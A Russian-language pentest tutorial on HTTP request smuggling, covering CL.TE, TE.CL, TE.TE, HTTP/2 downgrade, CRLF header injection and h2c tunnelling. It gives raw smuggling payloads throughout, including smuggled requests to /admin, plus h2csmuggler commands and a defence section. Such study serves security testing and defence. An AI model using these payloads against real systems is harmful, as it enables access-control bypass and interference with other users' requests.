# Контрабанда http/https и HTTP2

1. Природа уязвимости
HTTP Request Smuggling возникает из-за того, что разные компоненты инфраструктуры (прокси, балансировщики, веб-серверы) по-разному определяют границы HTTP-запросов. Это приводит к тому, что один запрос может быть «провезён» внутри другого, обходя безопасность и влияя на других пользователей.
Основная причина – существование двух заголовков, определяющих длину тела запроса:
Content-Length (CL) – число байт.
Transfer-Encoding: chunked (TE) – тело разбито на фрагменты, размер каждого указывается в шестнадцатеричном виде перед фрагментом, завершается фрагментом 0.
Когда присутствуют оба, разные серверы могут отдавать приоритет одному из них, создавая неоднозначность.

2. Классические техники HTTP/1.1
2.1 CL.TE
Фронтенд использует Content-Length.
Бэкенд использует Transfer-Encoding.
Пример payload:
text
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 160
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 50

delete_all=true
Объяснение: Фронтенд читает 160 байт тела (включая всё, что после 0), считает это одним запросом и передаёт бэкенду. Бэкенд видит Transfer-Encoding: chunked и интерпретирует 0 как конец первого запроса. Всё, что после 0, становится вторым запросом (POST /admin). Таким образом, атакующий добавляет скрытый запрос к /admin.
2.2 TE.CL
Фронтенд использует Transfer-Encoding.
Бэкенд использует Content-Length.
Пример payload:
text
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 50

delete_all=true
0
Объяснение: Фронтенд видит TE и обрабатывает chunked. 78 (hex = 120 байт) – размер первого фрагмента, который включает весь внедрённый запрос. Бэкенд, видя Content-Length: 4, читает только первые 4 байта тела (т.е. только 78\r\n), а остальное считает новым запросом. Внедрённый запрос выполняется.
2.3 TE.TE
Оба сервера используют TE, но по-разному обрабатывают некорректный TE-заголовок.
Пример:
text
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /admin HTTP/1.1
...
0
Один сервер игнорирует chunked1 и обрабатывает первый TE, другой может отклонить chunked1 и использовать CL. Это создаёт расхождение, приводящее к smuggling.

3. HTTP/2 downgrading
HTTP/2 имеет чёткие границы, поэтому smuggling в чистом HTTP/2 невозможен. Но когда прокси принимает HTTP/2 и преобразует в HTTP/1.1 для бэкенда, появляется возможность внедрять заголовки CL или TE в HTTP/2-запрос, которые будут перенесены в HTTP/1.1.
3.1 H2.CL
В HTTP/2 запросе добавляется Content-Length: 0. Прокси при downgrade передаёт этот CL в HTTP/1.1. Бэкенд считает, что тело пустое, а всё, что идёт после заголовков, – это следующий запрос.
Пример HTTP/2 запроса (упрощённо):
text
POST / HTTP/2
Host: vulnerable.com
Content-Length: 0

GET /admin HTTP/1.1
X: f
Результат: Бэкенд обрабатывает первый POST без тела, а остаток становится вторым запросом.
3.2 H2.TE
Аналогично, добавляется Transfer-Encoding: chunked. При downgrade бэкенд видит chunked и завершает первый запрос на 0, а остаток идёт как второй запрос.
Пример:
text
POST / HTTP/2
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: f
3.3 CRLF-инъекция в HTTP/2
HTTP/2 позволяет передавать двоичные данные в заголовках. Если вставить \r\n в значение заголовка, при переводе в HTTP/1.1 эти символы станут разделителями, позволяя внедрить новые заголовки или целый запрос.
Пример:
Заголовок Foo со значением:
text
bar\r\nHost: evil.com\r\n\r\nGET /admin HTTP/1.1
При downgrade прокси вставит этот заголовок, и в HTTP/1.1 появятся дополнительные строки, создавая второй запрос.

4. Request Tunnelling (туннелирование)
Если прокси выделяет отдельное бэкенд-соединение для каждого пользователя, влияние на чужие запросы невозможно. Однако можно туннелировать свои запросы, обходя фильтры прокси.
4.1 Утечка внутренних заголовков
Прокси часто добавляет заголовки (например, X-Forwarded-For, Host и т.д.). Чтобы их узнать, можно использовать CRLF-инъекцию и заставить приложение отразить их.
Шаги:
Базовый HTTP/2 запрос к /hello (или любому эндпоинту, отражающему параметр).
Удалить тело, установить Content-Length: 0.
Добавить заголовок Foo со значением, содержащим CRLF и второй запрос:
text
bar

POST /hello HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

q=
Отправить дважды подряд. Второй ответ отразит внутренние заголовки в параметре q.
Примечания:
Content-Length: 500 – оценка; подбирается, чтобы захватить все заголовки.
Если соединение зависает – длина слишком велика; если не все заголовки отобразились – длина мала.
В Burp Inspector вставлять \r\n через Shift+Enter.

5. h2c smuggling
h2c – HTTP/2 через незашифрованный канал. Согласование через Upgrade: h2c в HTTP/1.1.
5.1 Процесс
Клиент отправляет HTTP/1.1 запрос с Upgrade: h2c и HTTP2-Settings.
Если прокси пересылает этот запрос на бэкенд, а не обрабатывает сам, бэкенд отвечает 101 Switching Protocols.
После этого прокси перестаёт анализировать трафик (считает, что протокол изменился) и просто туннелирует данные.
Клиент может теперь отправлять HTTP/2-запросы напрямую к бэкенду, обходя ограничения прокси.
5.2 Использование
Часто применяется для доступа к ресурсам, которые прокси блокирует (например, /private). Инструмент h2csmuggler.py автоматизирует атаку:
bash
python3 h2csmuggler.py -x https://<прокси>/ https://<прокси>/private
Первый URL используется для установки туннеля (должен быть разрешён), второй – целевой. Может потребоваться несколько попыток.

6. Инструменты и настройки
Burp Suite Repeater
Для HTTP/2 запросов включите протокол в выпадающем списке (справа вверху).
Отключите Update Content-Length (чтобы не перезаписывать ваш Content-Length: 0).
Для редактирования заголовков с CRLF используйте Inspector (не текстовая панель).
После вставки CRLF запрос становится «kettled» – все изменения только через Inspector.
Отправляйте запрос несколько раз подряд (обычно 2-3 раза) для получения результата.
h2csmuggler
Python-скрипт от BishopFox.
Работает с прокси, поддерживающими пересылку Upgrade: h2c.
Пример: python3 h2csmuggler.py -x https://IP:8200/ https://IP:8200/private

8. Защита и предотвращение
Использовать HTTP/2 на всех уровнях, избегать downgrade.
Если downgrade неизбежен, настроить все компоненты на одинаковый приоритет (например, всегда использовать CL и игнорировать TE).
Валидировать и экранировать все пользовательские данные, особенно в заголовках.
Обновлять прокси и веб-серверы до последних версий (патчи против CVE).
Использовать современные балансировщики, которые корректно обрабатывают h2c.
Включать мониторинг аномалий в логах (неожиданные последовательности заголовков, сбои).
Ограничить поддержку h2c, если она не требуется.

10. Резюме
HTTP Request Smuggling – мощная атака, позволяющая внедрять вредоносные запросы, обходить WAF, красть данные и отравлять кэш. Основные векторы: несоответствие CL/TE, downgrade с HTTP/2 на HTTP/1.1, CRLF-инъекция и h2c туннели. Знание точных payloads и поведений разных прокси критически важно для пентеста. Всегда тестировать в контролируемой среде, так как атака может нарушить работу сервиса.
